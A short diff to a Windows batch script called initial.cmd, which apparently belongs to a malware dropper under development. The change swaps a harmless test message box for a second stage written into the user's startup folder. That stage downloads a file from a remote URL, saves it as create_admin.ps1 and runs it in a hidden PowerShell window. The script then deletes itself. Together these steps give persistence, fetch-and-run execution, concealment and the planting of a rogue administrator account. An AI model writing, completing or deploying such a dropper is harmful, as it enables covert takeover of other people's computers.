@@ -11,12 +11,13 @@ set "THIS_FILE_NAME=initial.cmd"
 cd %STARTUP_PATH%
 
 @REM write pyloads to startup
-(
-    echo MsgBox "Line 1" ^& vbCrlf ^& "lin 2", 262192, "Title"
-)> popus.vbs
+(   @REM write here needed link for the download the create_admin.ps1
+    echo powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/5MB.zip' -OutFile '%STARTUP_PATH%/create_admin.ps1'"
+    echo powershell -WindowStyle hidden "%STARTUP_PATH%/create_admin.ps1"
+)> stage2.cmd
 
 @REM run a payload
-WScript "%STARTUP_PATH%"\popus.vbs
+powershell -WindowStyle hidden "./stage2.cmd"
 
 @REM go back and delete ourselves
 cd %INITIAL_PATH%
